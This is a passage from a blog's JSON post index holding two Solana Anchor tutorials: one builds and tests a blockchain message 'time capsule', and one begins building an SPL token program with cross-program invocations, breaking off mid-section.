            "content": "Building a messaging app on Solana: Starting with a blockchain time capsule . Welcome to the Solana messaging app quest. With this quest you’ll get upto speed with the most rapidly rising blockchain in the market: Solana. It would be awesome if you know a bit of Rust or C++ already and are familiar with how blockchains work, but even if you do not have any specific background of Rust or Solana development, we will have all bases covered. If you have a high level of interest and motivation, we should be good to go ahead. . In this quest, we will be developing a blockchain based time-capsule. This essentially means that you’ll be able to leave a message on the Solana blockchain and anyone can view it for as long as the Solana blockchain itself exists. Your message will survive the test of time and could not be taken down by anyone. . This time-capsule quest will set us up for extending this project and creating an entire messaging app. How cool is that, right? . Setting up the Environment: . There are a few things that we need to get up and running before we move forward in this quest. Before we move forward make sure you’ve a working NodeJS environment set up. We need rust, Solana, Mocha(a JS testing framework), Anchor and Phantom wallet for this quest. To install rust, run . curl --proto &#39;=https&#39; --tlsv1.2 -sSf https://sh.rustup.rs | sh source $HOME/.cargo/env rustup component add rustfmt . To install Solana, run . sh -c &quot;$(curl -sSfL https://release.solana.com/v1.8.0/install)&quot; . To install mocha globally, run . npm install -g mocha . Now we’ll be installing Anchor. If you’re on a linux system, run . # Only on linux systems npm i -g @project-serum/anchor-cli . Fair Warning : If you are using a Windows system, we highly suggest using WSL2 (Windows sub-system for Linux) or switching to a Linux environment. Setting up WSL is also quick and easy. A good walk-through can be found here For any other OS, you need to build from source. Run the following command . cargo install --git https://github.com/project-serum/anchor --tag v0.18.0 anchor-cli --locked . To verify that Anchor is installed, run . anchor --version . Since Solana is still a pretty new blockchain compared to the establised ones out there, it’s developer tooling too is pretty limited and cumbersome as of now. However, it is rapidly improving and it does so on a daily basis. At the forefront of this development is Anchor, by Armani Ferrante. You can think of it like the Ruby on Rails framework for Ruby, that means yes, you can develop things on vanilla Ruby, but Ruby on Rails makes your life much much easier, right? That’s the same with Anchor and Solana development. Anchor is the Hardhat of Solana development plus much more. It offers a Rust DSL (basically, an easier Rust) to work with along with IDL, CLI and workspace management. . Running configurations on Solana CLI . The first command you should run on your terminal (assuming Solana CLI was properly installed in the last quest) is: . solana config get . This should throw up a result similar to something like: . . If you didnot set up your keypair earlier, then you won’t be having the Keypair Path in your results. To set that up, follow the instructions over here . We would want to remain on the local network for building our program and later shift to the devent or mainnet-beta if required. If the RPC URL field of your last result did not show localhost, you can set it to localhost using the following command: . solana config set --url localhost . Next, we would want to know our account/wallet address and airdrop some SOL tokens into it, to handle all the deployment, transactions etc costs that come with interacting with and using a Solana program. To do that first let’s find our address. The command to do that is: . solana address . This would result into something like this: . . Then, for more comprehensive details of your account, use the following command with the address that you got from the last command . solana account &lt;your address from the last command&gt; . This would result into something like this: . . Next, we want to spin up our local network. Think of this local network as a mock Solana blockchain running on your own single system. This network would be required for development and testing of our program. To spin it up, in a separate tab, use the following command: . solana-test-validator . Once you get an image, like the one below, you know that your local validator (local network) is now up and running . . Now, our last task is to top up our account with some SOL, which you can do by using: . solana airdrop 100 . This should result in something like: . . Setting up our Anchor project . In this sub-quest all we would do is initialize an Anchor project and see whether everything’s there and working fine or not and after move on ahead to make our own changes. Head over to your preferred destination for the project using your terminal and then type the following command: . anchor init messengerapp cd messengerapp . This would result in a screen somewhat similar to this: . . First we check whether we can see the programs, app, programs, migrations directory among others or not. If we can, we would head over to programs/messengerapp/src/lib.rs to see the default program that Anchor provides us. This is the most basic example possible on Anchor and what’s happening here is simply that a user-defined function Initialize whenever called would successfully exit the program. That’s all, nothing fancy. Now, let’s try to compile this program using the following command: . anchor build . This would trigger a build function and would something like this upon completion: . . This build creates a new folder in your project directory called, target. This target folder contains the idl directory, which would also contain the idl for our program. The IDL or Interface Description Language describes the instructions exposed by the contract and is very similar to ABI in Solidity and user for similar purposes, ie, for tests and front-end integrations. Next, we can move onto testing this program, so that we can get familiar with how testing is done in Anchor. Head to tests/messengerapp.js. Here, you’ll see a test written in javascript to interact and test the default program. There are a lot of things in the test, that may not make sense to you right now, but stick around and we’ll get to those shortly. The test would look something like this: . . Next, to actually run these tests, first head over to the tab where you ran the solana-test-validator command and kill that process (using Ctrl-C). Now, use the following command: . anchor test . The passing tests should result in the following screen: . . Now, let’s head over to the programs directory again and start making changes to create our messaging app. . Writing our first program function . Head over to programs/messengerapp/src/lib.rs and clear the code written there apart from the macro declarations and crates (libraries) that we will be using. After the clearning, your coding screen should look somehting like this: . . Now let us simply define two functions that we will be using in our Solana program. The bulk of the program goes in a module under the #[program] macro. We’ll just define them under the pub mod messengerapp and write the logic later. These two function definitions would look like this: . pub fn initialize(ctx: Context&lt;Initialize&gt;, data: String) -&gt; ProgramResult { } pub fn update(ctx: Context&lt;Update&gt;, data: String) -&gt; ProgramResult { } . Here pub means public and fn means function, implying that they are public functions that can be invoked from our program, ie it becomes a client-callable program function. The first argument of these functions is always Context&lt;T&gt; which consist of the solana accounts array and the program ID, which in essence is the required data to call just about any progarm on Solana. The next parameter of both these functions is a String named data, which we will be using as our message. The ProgramResult is the return type of both these functions, which actually is just an easier method to serve function results and/or errors. . After defining the above two functions, your code should look something like this: . . Now, let’s write our logic for the initialize function, ok? Let’s first make our intentions clear for this function and the program in general. We want to keep track of two things here. First, is the data that is being passed while calling the function and the second is the list of all the data(messages) that have been passed to our specific account. So, we would want our main account (the account that will handle all the messaging stuff of the program) to have two fields, one for storing the incoming data and the other for keeping a record of all earlier data. We call this account the base_account. Also, keep in mind that since we will be adding to the data_list everytime a new data is introduced, we will need the account to be mutable, ie, the account should be able to accept changes. Write the following logic inside the initialize function now: . let base_account = &amp;mut ctx.accounts.base_account; let copy = data.clone(); base_account.data = data; base_account.data_list.push(copy); Ok(()) . The Ok(()) syntax is used for error handling of the ProgramResult type. You can think of Ok(()) like a gate, that lets the program continue if there are no errors but sends the program into another state if an error is encountered. . Now, your coding screen should look something like this: . A small note about Accounts on Solana: An account is not actually a wallet. Instead, it’s a way for the contract to persist data between calls. This includes information such as the count in our base_account, and also information about permissions on the account. Accounts pay rent in the form of lamports, and if it runs out, then the account is purged from the blockchain. Accounts with two years worth of rent attached are “rent-exempt” and can stay on the chain forever. . Writing out our second function . In the last sub-quest we defined the update function, right? Now let’s go ahead and write the logic for this function. . let base_account = &amp;mut ctx.accounts.base_account; let copy = data.clone(); base_account.data = data; base_account.data_list.push(copy); Ok(()) . Your code screen should now look like this: . Wasn’t this funny? We wrote the same code again, right? Well, yes, the logic of both the functions were same and the only real difference is in the Account inside of the Context&lt;&gt; struct. This is a simple container for the currently executing program_id generic over Accounts. This essentially is what would differentiate between whether the message coming in our program is the first message or some later messages. Now, the natural question would be where are all these structs defined? Calm down, champ. We haven’t yet defined them, but that is exactly what we will be doing next. . Defining the first Account struct used in our program . Let’s first define the Initialize struct used in our initialize function that we defined two sub-quests back. We already have gone over what Accounts and Context are. So, here just keep in mind that whenever we need to include multiple accounts in a struct, we would use the derive Accounts macro, which is #[derive(Accounts)], basically when we want to derive an account to pass to the function using other accounts, we use the derive accounts macro and while defining a singular account we would simply use the normal account macro, which is [account]. Now the normal account marco can also consist of many parameters which denote the permissions related to that particular account and we will look into those as we move ahead. Write the following code into your editor: . #[derive(Accounts)] pub struct Initialize&lt;&#39;info&gt; { #[account(init, payer = user, space = 64 + 64)] pub base_account: Account&lt;&#39;info, BaseAccount&gt;, #[account(mut)] pub user: Signer&lt;&#39;info&gt;, pub system_program: Program&lt;&#39;info, System&gt;, } . As discussed earlier, we used the derive Accounts macro since we had to incorporate 3 accounts here and for all these three accounts individually, we used the account macro. Now onto the arguments used with these macros. The init macro is used to create a new account owned by the current program which is our messengerapp program. Whenever init parameter is used, we must always specify the payer or the account that will be paying for creation of the account on the Solana blockchain, along with the space param which is the space with which the new account is created. . The mut parameter marks an account as mutable, which essentially means our account will be altered and Solana will need to update the data in your account. So, always use the mut parameter for persisting changes. . Another new concept used here is the Signer type. This is used to enforce the constraint that the authority account (messengerapp in this case) signed the transaction. . The peculiar thing you might notice here is that the base_account field is of type BaseAccount, but that BaseAccount is not to be found anywhere, right? As always, we will be defining that in just the next sub-quest. So hold on and re-read all the info that you just recieved if you feel the need. In the next sub-quest we will be defining the Update and BaseAccount structs. . Your coding screen should look like this right now: . . Further Reading: . You can read up on different types of account constraints here. . Defining all remaining Accounts of our program . With the understanding about all kinds of Account marcos and the associated parameters with them, let’s get straight into writing the other two account structs. . pub struct Update&lt;&#39;info&gt; { #[account(mut)] pub base_account: Account&lt;&#39;info, BaseAccount&gt;, . and now the final BaseAccount struct: . #[account] pub struct BaseAccount { pub data: String, pub data_list: Vec&lt;String&gt;, . Now, for the Update account struct, we notice that it is essentially the same as the Initialize account struct, it’s just that we are using an existing field base_account of type BaseAccount and not creating it. After which, we define the BaseAccount that was being used everywhere. As discussed earlier, it has two fields, one is data of type String to store the incoming value of the message while the other is a vector of strings to store/persist all the messages in that account. A vector is a list of elements with no specified size. But, bear in mind that initially we had createed our base account with the space of 64 + 64 so there will be a limit to thow many messages can be stored. You can explore the limits at different sizes as a side quest. . After writing these definitions, your code screen should be looking something like this: . . Good, now we are just one step away from being completely done with the smart contract (programs in Solana lingo) side of our project. . Updating our program_id . Remember the declare_id! macro of our program that was declared at the top with a random looking string, that we did not talk about? It is time to fix that. Currently, it looks something like this: . . Since, we already discussed that we would be working on our local network, we need to deploy our program on our local network and then put the program_id recieved from there here at this macro. First make sure that your local validator is running in a different tab. If it is not, run it again in a different tab using the solana-test-validator command. Now use the following command to deploy your anchor program: . anchor deploy . The above command should result in a screen similar to this: . . Now, copy the program ID from the above output to the declare_id macro in our program. Something like this: . . Congratulations, we are now done with writing the programs of our project. You just completed the smart contract (programs in Solana lingo) side of the Time Capsule project :D . Creating the testing skeleton of our program . Head over to tests/messengerapp.js and delete everything that’s written there. We are going to be writing our tests from scratch. The first step would be to import the necessary libraries and constants. To do that, use the following code: . const assert = require(&#39;assert&#39;); const anchor = require(&#39;@project-serum/anchor&#39;); const { SystemProgram } = anchor.web3; . Now, since we will be using Mocha for testing our programs, we will create the skeleton of where we will be putting our tests. So, basically, how Mocha works is that it takes describe blocks as testing blocks and within those describe blocks there are numerous tests written using the it blocks. So, use the following code to create the skeleton: . describe(&quot;Testing our messaging app: &quot;, function() { const provider = anchor.Provider.env(); anchor.setProvider(provider); const program = anchor.workspace.Messengerapp; it(&quot;An account is initialized&quot;, async function() { }); it(&quot;Update the account previously created: &quot;, async function() { }); }); . Now, your code screen should look something like: . . The additional things that we coded there were the introduction of provider. The provider is the abstraction of a connection to the Solana network. In the test, the Anchor framework will create the provider for us based on the environment (anchor.Provider.env()). . Now, the program is an abstraction that combines the Provider, idl, and the programID (which is generated when the program is built) and allows us to call RPC methods against our program. . When we have these two things, we can start calling functions in our program, which is what we will be doing in our next sub-quest. . Writing our first test . The method to call the functions of our program is pretty straight-forward. We will use the program RPCs (Remote procedure calls) to access the function and then we will use the web3.js library to create accounts which have to be passed as the parameters to those functions. Let’s first jump into the code of our first test and see things in action. . it(&quot;An account is initialized&quot;, async function() { const baseAccount = anchor.web3.Keypair.generate(); await program.rpc.initialize(&quot;My first message&quot;, { accounts: { baseAccount: baseAccount.publicKey, user: provider.wallet.publicKey, systemProgram: SystemProgram.programId, }, signers: [baseAccount] }); }); . Now, what we have done in the code above is simply create a baseAccount by generating a new account using the web3 library. Then using the program RPC, we have called the initialize function and to that function we have supplied the required parameters, which were the baseAccount, user, systemProgram and the signer. . After this function is run, we simply need to grab hold of the baseAccount and check it’s data field and verify whether it has changed to My first message or not. To do that, we use the following lines of code: . const account = await program.account.baseAccount.fetch(baseAccount.publicKey); console.log(&#39;Data: &#39;, account.data); assert.ok(account.data === &quot;My first message&quot;); _baseAccount = baseAccount; . After this, your coding screen should look like this: . . What we did here fetch the baseAccount from the program after the initialize function has been run and store it in a variable called account. Then we check whether the data field of account is the same as our message or not. In the last step, we save the state of this baseAccount in a variable called _baseAccount, so that we can check that later in the other tests. . Now let us write the second test, where we update the previously created baseAccount which we stored in _baseAccount and check whether new messages get stored in the data_list field or not. . Writing the second test . As mentioned in the last quest, our objective with this test is to update the data_list field of the baseAccount and then verify this updation. To do that, we will write the below code: . const baseAccount = _baseAccount; await program.rpc.update(&quot;My second message&quot;, { accounts: { baseAccount: baseAccount.publicKey, }, }); . With the above code, we assigned the _baseAccount to a new baseAccount. This step can be skipped. After that, just like how we called the initialize function earlier, we called the update function and provided it with the required params, which are the new message and the baseAccount. After that to verify whether the update took place or not, we will use the following code: . const account = await program.account.baseAccount.fetch(baseAccount.publicKey); console.log(&quot;Updated data: &quot;, account.data); assert.ok(account.data === &quot;My second message&quot;); console.log(&quot;All account data: &quot;, account); console.log(&quot;All data: &quot;, account.dataList); assert.ok(account.dataList.length === 2); . With this, your coding screen should look something like this: . . The console.logs can be skipped, but they are there for our own better understanding. So, in this block of code, we again fetch the baseAccount after the update function and check whether the data of the account has been updated or not. Then we print the details of the account itself, then the entire list of all the messages and finally we check whether the length of this data_list field of the baseAccount is 2 or not (since it should ideally contain [My first message, My second message]). . With this we are done writing our tests, now all that remains is to actually run these tests. . Testing our program . Remember, some time back we changed the program_id in the declare_id macro of our program? We will follow a similar step in the Anchor.toml file now. Open the Anchor.toml file and replace the old program_id with the new program_id, like so: . . Now, it’s the moment of truth. Head over to the console and type the following command if you have not stopped the solana-test-validator running in a different tab: . anchor test --skip-local-validator . This will hopefully give a result similar to this: . . And if this didn’t work for you go to your local validator tab and close it using Ctrl + C and after come back to the tab where you were testing and type the following command: . anchor test . This should yield a result similar to: . . Congratulations . Congratulations on not only building the building blocks of a chat application on Solana, which you can use as time-capsule on the blockchain, but also successfully testing that. In the next quest, we can go on ahead to see how to connect the front-end of a website with our program and see for ourselves how well our program is working. See you all soon :) .",
            "url": "https://saxenism.com/solana/anchor/tutorial/web3/2021/11/26/Solana-Tutorial-Build-A-Messaging-App.html",
            "relUrl": "/solana/anchor/tutorial/web3/2021/11/26/Solana-Tutorial-Build-A-Messaging-App.html",
            "date": " • Nov 26, 2021"
        }
        
    
  
    
        ,"post17": {
            "title": "Solana Anchor Tutorial: Create your own tokens ",
            "content": "Building your own crypto-currency using Solana programs . Welcome to the Solana crypto-currency quest. With this quest you’ll get upto speed with the most rapidly rising blockchain in the market: Solana. It would be awesome if you know a bit of Rust (or even C++ concepts) already and are familiar with how blockchains work, but even if you do not have any specific background of Rust or Solana development, we will have all bases covered. If you have a high level of interest and motivation, we should be good to go ahead. . In this quest, we will be developing our own crypto-currency on the Solana blockchain or our own spl-token in the Solana lingo. This essentially means that once you are done with this quest, you will be able to make your crypto-currency using Solana programs and use that to do whatever you can think of, including using it as a fan token, a social token, a governance token, a utility token or a coin. . Setting up the Environment: . There are a few things that we need to get up and running before we move forward in this quest. Before we move forward make sure you’ve a working NodeJS environment set up. We need rust, Solana, Mocha(a JS testing framework), Anchor and Phantom wallet for this quest. To install rust, run . curl --proto &#39;=https&#39; --tlsv1.2 -sSf https://sh.rustup.rs | sh source $HOME/.cargo/env rustup component add rustfmt . To install Solana, run . sh -c &quot;$(curl -sSfL https://release.solana.com/v1.8.0/install)&quot; . To install mocha globally, run . npm install -g mocha . Now we’ll be installing Anchor. If you’re on a linux system, run . # Only on linux systems npm i -g @project-serum/anchor-cli . Fair Warning : If you are using a Windows system, we highly suggest using WSL2 (Windows sub-system for Linux) or switching to a Linux environment. Setting up WSL is also quick and easy. A good walk-through can be found here For any other OS, you need to build from source. Run the following command . cargo install --git https://github.com/project-serum/anchor --tag v0.17.0 anchor-cli --locked . To verify that Anchor is installed, run . anchor --version . Since Solana is still a pretty new blockchain compared to the establised ones out there, it’s developer tooling too is pretty limited and cumbersome as of now. However, it is rapidly improving and it does so on a daily basis. At the forefront of this development is Anchor, by Armani Ferrante. You can think of it like the Ruby on Rails framework for Ruby, that means yes, you can develop things on vanilla Ruby, but Ruby on Rails makes your life much much easier, right? That’s the same with Anchor and Solana development. Anchor is the Hardhat of Solana development plus much more. It offers a Rust DSL (basically, an easier Rust) to work with along with IDL, CLI and workspace management. Anchor abstracts away a lot of potential security holes from a conventional Solana program, takes care of the serialization and deserialization, reduces large boilder-platey code to macros and lot of other good good stuff. . Running configurations on Solana CLI . The first command you should run on your terminal (assuming Solana CLI was properly installed in the last quest) is: . solana config get . This should throw up a result similar to something like: . . If you didnot set up your keypair earlier, then you won’t be having the Keypair Path in your results. To set that up, follow the instructions over here . We would want to remain on the local network for building our program and later shift to the devent or mainnet-beta if required. If the RPC URL field of your last result did not show localhost, you can set it to localhost using the following command: . solana config set --url localhost . Next, we would want to know our account/wallet address and airdrop some SOL tokens into it, to handle all the deployment, transactions etc costs that come with interacting with and using a Solana program. To do that first let’s find our address. The command to do that is: . solana address . This would result into something like this: . . Then, for more comprehensive details of your account, use the following command with the address that you got from the last command . solana account &lt;your address from the last command&gt; . This would result into something like this: . . Next, we want to spin up our local network. Think of this local network as a mock Solana blockchain running on your own single system. This network would be required for development and testing of our program. To spin it up, in a separate tab, use the following command: . solana-test-validator . Once you get an image, like the one below, you know that your local validator (local network) is now up and running . . Now, our last task is to top up our account with some SOL, which you can do by using: . solana airdrop 100 . This should result in something like: . . Setting up our Anchor project . In this sub-quest all we would do is initialize an Anchor project and see whether everything’s there and working fine or not and after move on ahead to make our own changes. Head over to your preferred destination for the project using your terminal and then type the following command: . anchor init mymoneydapp cd mymoneydapp . This would result in a screen somewhat similar to this: . . First we check whether we can see the programs, app, programs, migrations directory among others or not. If we can, we would head over to programs/messengerapp/src/lib.rs to see the default program that Anchor provides us. This is the most basic example possible on Anchor and what’s happening here is simply that a user-defined function Initialize whenever called would successfully exit the program. That’s all, nothing fancy. Now, let’s try to compile this program using the following command: . anchor build . This would trigger a build function and would something like this upon completion: . . This build creates a new folder in your project directory called, target. This target folder contains the idl directory, which would also contain the idl for our program. The IDL or Interface Description Language describes the instructions exposed by the contract and is very similar to ABI in Solidity and user for similar purposes, ie, for tests and front-end integrations. Next, we can move onto testing this program, so that we can get familiar with how testing is done in Anchor. Head to tests/messengerapp.js. Here, you’ll see a test written in javascript to interact and test the default program. There are a lot of things in the test, that may not make sense to you right now, but stick around and we’ll get to those shortly. The test would look something like this: . . Next, to actually run these tests, first head over to the tab where you ran the solana-test-validator command and kill that process (using Ctrl-C). Now, use the following command: . anchor test . The passing tests should result in the following screen: . . Now, let’s head over to the programs directory and start importing some cool Rust crates provided by Anchor which will help us build our money app. . Importing the Anchor SPL Crates . Head over to programs/mymoneydapp/Cargo.toml and under dependencies, add the two following lines: . anchor-spl = &quot;0.17.0&quot; spl-token = { version = &quot;3.1.1&quot;, features = [&quot;no-entrypoint&quot;] } . Make sure that the version of the anchor-spl you write here, matches the version of anchor-lang that you had installed. It would be much more convenient for you if install the same version that we are using in the quest. After these changes, the Cargo.toml file would look something like this: . . Now that we are done adding the dependencies in the Cargo file, let’s call it inside our program too. Write down the following use statments at the very top of your programs/mymoneydapp/src/lib.rs file: . use anchor_spl::token::{self, Burn, MintTo, SetAuthority, Transfer}; . After this, clear all the default code that we were provided with, this would make your coding screen look something like: . . Writing our first program function . Head over to programs/mymoneydapp/src/lib.rs and clear the code written there apart from the macro declarations and crates (libraries) that we will be using. After the clearning, your coding screen should look something like the last screen of the last quest. . Now let us simply define four functions that we will be using in our Solana program. The bulk of the program goes in a module under the #[program] macro. We’ll just define them under the pub mod mymoneydapp and write the logic later. These four function definitions would look like this: . pub fn proxy_transfer(ctx: Context&lt;ProxyTransfer&gt;, amount: u64) -&gt; ProgramResult { } pub fn proxy_mint_to(ctx: Context&lt;ProxyMintTo&gt;, amount: u64) -&gt; ProgramResult { } pub fn proxy_burn(ctx: Context&lt;ProxyBurn&gt;, amount: u64) -&gt; ProgramResult { } pub fn proxy_set_authority( ctx: Context&lt;ProxySetAuthority&gt;, authority_type: AuthorityType, new_authority: Option&lt;Pubkey&gt;, ) -&gt; ProgramResult { } . Notice the use of the word proxy in each function name? That is because we would be doing Cross Program Invocation or CPI for short in this program of ours. This essentially means that we would be calling functions of other Solana programs from our program. As you might have guessed, we would be calling the functions from the anchor_spl programs, which is the (abstracted) Anchor implementation of the spl-programs that you can find in the Solana Rust SDK. To look at the structure and explore the anchor_spl programs more, visit https://github.com/project-serum/anchor/tree/v0.17.0/spl. Reading through that would also help us understand the implementations later on. . Here pub means public and fn means function, implying that they are public functions that can be invoked from our program, ie it becomes a client-callable program function. The first argument of these functions is always Context&lt;T&gt; which consist of the solana accounts array and the program ID, which in essence is the required data to call just about any progarm on Solana. The next parameter of these functions is a u64 or an unsigned integer named amount, which we will be using as our the amount of our tokens in different functions. The ProgramResult is the return type of both these functions, which actually is just an easier method to serve function results and/or errors. . As discussed earlier, the Context parameter in each function is essentially a list of all the accounts that must be passed for the function to work as expected and the different structs you see in all Contexts such as ProxyTransfer, ProxyMintTo, etc will be defined later. . After defining the above four functions, your code should look something like this: . . Writing the logic for our functions . The logic of all of our functions would be very straight-forward. We would simply call the functions provided by anchor_spl with the correct parameters. That’s it. Simple. First update your code as the following: . pub fn proxy_transfer(ctx: Context&lt;ProxyTransfer&gt;, amount: u64) -&gt; ProgramResult { token::transfer(ctx.accounts.into(), amount) } pub fn proxy_mint_to(ctx: Context&lt;ProxyMintTo&gt;, amount: u64) -&gt; ProgramResult { token::mint_to(ctx.accounts.into(), amount) } pub fn proxy_burn(ctx: Context&lt;ProxyBurn&gt;, amount: u64) -&gt; ProgramResult { token::burn(ctx.accounts.into(), amount) } pub fn proxy_set_authority( ctx: Context&lt;ProxySetAuthority&gt;, authority_type: AuthorityType, new_authority: Option&lt;Pubkey&gt;, ) -&gt; ProgramResult { token::set_authority(ctx.accounts.into(), authority_type.into(), new_authority) } . With this, your coding screen would look something like: . . If you want to further investigate the functions that we called here, you can head over to the official docs of the anchor_spl crate. . Let’s learn to serialize and deserialize . You might already be familiar with the concept of enumerate or enum as that is a fairly language agnostic concept. However, if you are not, you can think of enums as a convenient way of naming states or conditions in your code. . Coming to what is serialization and deserialization, the good news is that Anchor does all the heavy lifting in this regards and we just need to know what these terms mean. Simple. So, serialize in general means to put together some data in a standard format and conversely deserealize means to break down a monolith into a standard format of many pieces of data. In terms of Anchor programming, AccountSerialize macro is used when a data structure can be serialized and stored into account storage, ie in an AccountInfo’s mutable data slice. Similarly, AccountDeserialize macro is used when a data structure can be de-serialized from binary format. This macro deserializes the instance from a given slice of bytes and updates the buffer to point at the remaining bytes. . Let’s see the above concepts in action. Write the following code outside of the #[program] module: . #[derive(AnchorSerialize, AnchorDeserialize)] pub enum AuthorityType { MintTokens, FreezeAccount, AccountOwner, CloseAccount } . Since literally everything on the Solana blockchain should be in form of an account, the derive macro is used to convert this enum in the format of an account. MintTokens here would represent the authority to mint new tokens, FreezeAccount to freeze accounts associated with the Mint, AccountOwner being the owners of a token account and CloseAccount representing the authority to close a token account. . After this, your screen would look something like: . . A small note about Accounts on Solana: . An account is not actually a wallet. Instead, it’s a way for the contract to persist data between calls. This includes information such as the count in our base_account, and also information about permissions on the account. Accounts pay rent in the form of lamports, and if it runs out, then the account is purged from the blockchain. Accounts with two years worth of rent attached are “rent-exempt” and can stay on the chain forever. . Defining our first account struct . In the first function, we used the ProxyTransfer struct, right? Now, let’s define it so that every relevant information along with the correct constraints on those information (accounts) can be passed to our proxy_transfer function. Write the following lines of codes below your Serialize and Deserialize code: . #[derive(Accounts)] pub struct ProxyTransfer&lt;&#39;info&gt; { #[account(signer)] pub authority: AccountInfo&lt;&#39;info&gt;, #[account(mut)] pub from: AccountInfo&lt;&#39;info&gt;, #[account(mut)] pub to: AccountInfo&lt;&#39;info&gt;, pub token_program: AccountInfo&lt;&#39;info&gt;, } . As discussed earlier, everything on Solana is an account, so we convert the ProxyTransfer struct (with all the relevant information for the proxy_transfer function) into an account using the derive account macro in the code above. The account signer macro you see is used to enforce the constraint that the authority is the one who signs the transaction (of calling the function) and the account mut macro is used to mark an account as mutable, ie, we want to persist changes in those accounts. Now coming onto the accounts themselves, these are a from account from which the transfer will take place and the to account, to which the tokens will go to. Then the authority is the one who should be able to execute these programs and the token_program is used to identify which function to call from the original crate. . After this, your code screen should look something like: . Small note about the Access Control macros . The Accounts macro implements the Accounts trait. Transforms a struct from the untrusted &amp;[AccountInfo] slice given to a Solana progam into a validated struct of deserialized account types . #[account]: It is an attribute macro implementing AccountSerialize and AccountDeserialize . Account Wrapper type for a deserialized account implementing AccountDeserialize. Using this type within an Accounts struct ensures the account is owned by the address defined by declare_id! where the inner account was defined. . With the above (and more Account Constraints and Access Controllers) we can define preconditions for our any instruction handler expecting a certain set of accounts, allowing us to more easily reason about the security of our programs. . Defining all other accounts . In a similar fashion to the ProxyTransfer account struct, we can define ProxyMintTo, ProxyBurn and ProxySetAuthority structs with the desired information (accounts) in each of them as required by their respective functions. It’ll be a fun exercise for you to open up the anchor-spl crate in Anchor’s github and try to figure out what would be structure of all the remaining account structs. . Once you have given it your best shot, comapre your structs with what we have here. Up first is the ProxyMintTo struct that will be used to call the proxy_mint_to function. . #[derive(Accounts)] pub struct ProxyMintTo&lt;&#39;info&gt; { #[account(signer)] pub authority: AccountInfo&lt;&#39;info&gt;, #[account(mut)] pub mint: AccountInfo&lt;&#39;info&gt;, #[account(mut)] pub to: AccountInfo&lt;&#39;info&gt;, pub token_program: AccountInfo&lt;&#39;info&gt;, } . This structure is pretty similar to the ProxyTransfer struct we defined in the last quest, right? The difference here is with the Mint account that is essentially the account of your token, and we would want that to be mutable since you can change supplies and so on. . Let’s tackle the ProxyBurn struct next that will be used to call the proxy_burn function. That would have a structure similar to this: . #[derive(Accounts)] pub struct ProxyBurn&lt;&#39;info&gt; { #[account(signer)] pub authority: AccountInfo&lt;&#39;info&gt;, #[account(mut)] pub mint: AccountInfo&lt;&#39;info&gt;, #[account(mut)] pub to: AccountInfo&lt;&#39;info&gt;, pub token_program: AccountInfo&lt;&#39;info&gt;, } . This structure is again pretty similar to our earlier structs, right? This also requires a mint account so that the function could know which token account has to be disabled. . With that let’s tackle the final account struct, the ProxySetAuthority and as you might have guessed, it is slightly different than the rest of the structs: . #[derive(Accounts)] pub struct ProxySetAuthority&lt;&#39;info&gt; { #[account(signer)] pub current_authority: AccountInfo&lt;&#39;info&gt;, #[account(mut)] pub account_or_mint: AccountInfo&lt;&#39;info&gt;, pub token_program: AccountInfo&lt;&#39;info&gt;, } . The accounts here are used to determine who the current authority is and whether that authority is the one who has signed this transaction or not and whether the new authority of the token account is going to be another account or a mint and then there’s the token program again to identify the correct program call. . After defining these accounts, your code screen should look something like this: . . Say hi to Cross Program Invocations (CPIs) . We did briefly talk about Cross Program Invocations, right? We don’t really need to get into the details of it and a simple understanding that CPIs are used to invoke instructions (functions) on another program. To do so on Anchor is pretty straight-forward since it does a lot of stuff for us under the hood. All we need to is: . Create a CpiContext object with the target instructin’s accounts and program. | To perform CPI, just use the cpi module | Accounts used for CPI are not specifically denoted as such with the CpiAccount label since v0.15. Accounts used for CPI are not fundamentally different from Program or Signer accounts except for their role and ownership in the specific context in which they are used. | So now with the above points in mind, let’s create implementation blocks impl which we will use to create the CpiContexts. We will later use these CpiContexts to invoke instructions from other programs. Create impl blocks for all account structs and write the following lines of code: . For ProxyTransfer . impl &lt;&#39;a, &#39;b, &#39;c, &#39;info&gt; From&lt;&amp;mut ProxyTransfer&lt;&#39;info&gt;&gt; for CpiContext&lt;&#39;a, &#39;b, &#39;c, &#39;info, Transfer&lt;&#39;info&gt;&gt; { } . For ProxyMintTo . impl&lt;&#39;a, &#39;b, &#39;c, &#39;info&gt; From&lt;&amp;mut ProxyMintTo&lt;&#39;info&gt;&gt; for CpiContext&lt;&#39;a, &#39;b, &#39;c, &#39;info, MintTo&lt;&#39;info&gt;&gt; { } . For ProxyBurn . impl&lt;&#39;a, &#39;b, &#39;c, &#39;info&gt; From&lt;&amp;mut ProxyBurn&lt;&#39;info&gt;&gt; for CpiContext&lt;&#39;a, &#39;b, &#39;c, &#39;info, Burn&lt;&#39;info&gt;&gt; { } . For ProxySetAuthority . impl&lt;&#39;a, &#39;b, &#39;c, &#39;info&gt; From&lt;&amp;mut ProxySetAuthority&lt;&#39;info&gt;&gt; for CpiContext&lt;&#39;a, &#39;b, &#39;c, &#39;info, SetAuthority&lt;&#39;info&gt;&gt; { } . After writing all these, your code screen should look something like this: . . Our first CPI . In the last quest we created all the impl (implementatuon) blocks for creating the CpiContexts that we will now use to call the functions from the other program. . Now, let me apologise very quickly, since I hadn’t been very transparent with you. Remember the strange into keyword we used earlier while writing our program functions without any explanation? Well, let me then introduce you to the wonders of the Rust language. The Rust language provides something called the From and Into traits which is essentially a cool way to convert typeA into typeB. Since we know from last quest that we require a CpiContext and a list of CpiAccounts to perform CPI and we also know that the functions that we had written in the very beginning are performing CPI, so logically we come to the conclusion that now we must write from implementations for those into that we used, so that they can be converted into the required format which is CpiContexts and CpiAccounts. . So, let’s see the first implementation of our from block that can help convert the parameters of the functions inside of our functions into CpiContext and CpiAccounts. Write down the below code: . impl&lt;&#39;a, &#39;b, &#39;c, &#39;info&gt; From&lt;&amp;mut ProxyTransfer&lt;&#39;info&gt;&gt; for CpiContext&lt;&#39;a, &#39;b, &#39;c, &#39;info, Transfer&lt;&#39;info&gt;&gt; { fn from(accounts: &amp;mut ProxyTransfer&lt;&#39;info&gt;) -&gt; CpiContext&lt;&#39;a, &#39;b, &#39;c, &#39;info, Transfer&lt;&#39;info&gt;&gt; { let cpi_accounts = Transfer { from: accounts.from.clone(), to: accounts.to.clone(), authority: accounts.authority.clone(), }; let cpi_program = accounts.token_program.clone(); CpiContext::new(cpi_program, cpi_accounts) } } . In the above code block we first create a list of our CpiAccounts called cpi_accounts, then we reference the program that we want to call with the variable name of cpi_program and create the new context using CpiContext::new. With this implementation our first program proxy_transfer is completely ready for doing CPIs. . Writing the above code, your code screen should look something like this: . . Implementing all other from blocks . Based on 